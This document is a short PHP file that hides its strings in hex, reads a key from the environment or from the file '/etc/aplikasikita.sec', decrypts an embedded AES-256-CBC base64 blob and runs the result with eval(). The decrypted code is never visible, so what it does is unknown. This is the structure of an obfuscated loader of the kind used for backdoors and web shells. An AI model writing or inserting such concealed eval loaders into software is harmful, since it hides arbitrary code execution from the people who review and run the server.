<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('t4R0hKIt8DX+7qOlqFL/hg==');

$c=base64_decode(

'7x6suWp3mxhB9DK8Ie1P74i3Hb9k0daw0WSUW5EPbcVGdZXqgMB7VX4jR9mB7whzbd7yjpBOIlzk' .
'oxRif1Yor7iu10TKohMoGQVMiSGTNzn4evrRQmLDBV5HZfCjVjhg9GTCARpa9SHdTD/jrxnp8W+v' .
'/ZF+Ks/+F7t5wcsvQXP5j3kW/aX6YRBVUaTFAz7zTaNhhEcdi7tgx2BlXhJwB82EczEzO/fCz+nQ' .
'fNL5ShaFdTYZJ/4elrljmGBclMDZn017Ei03G5ZkUeaf5YAHEXpnD6aUxXvYEsPl1GfoYVxhBsy6' .
'ngB6Z8VRJ1mCdeIqx/ERCCH1OBbPzdl+xaGjzI+RFGTASTFtr3wTha6++fr6CjASWc1NLEtTtchZ' .
'3u7Yd4vp91twMqTgW+J+Vz28iqTHc/Jvqhz+kMHfwgJYNvInrcBRR+yIhUSWhqrEQ/er5oT8qghW' .
'Zs86YujWjobQQ98bGOguSVB5bdovUwVYYJ5+O0wh1O0QdppNHAMhY9a7CBQq2fDAAIJ6WFrWD1eU' .
'noO4JRa9BPh/PsKf0bmFp4WLzpkCuc4cr/dmKhURCeSSICD4K+2gVv6EwDd6T6DTQYhj54PIwEUK' .
'wIWXqzSSpDg2cBvLLqgcrpwr1G+rkKwhGydrJcQH7uf+sL9wk7nOBf2Kb4WU2oSm9FC/4kU1bKJ8' .
'J1QBwyZpePLhihlVuBMd0nHnzvTmf8UGDqZJCqj+4Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

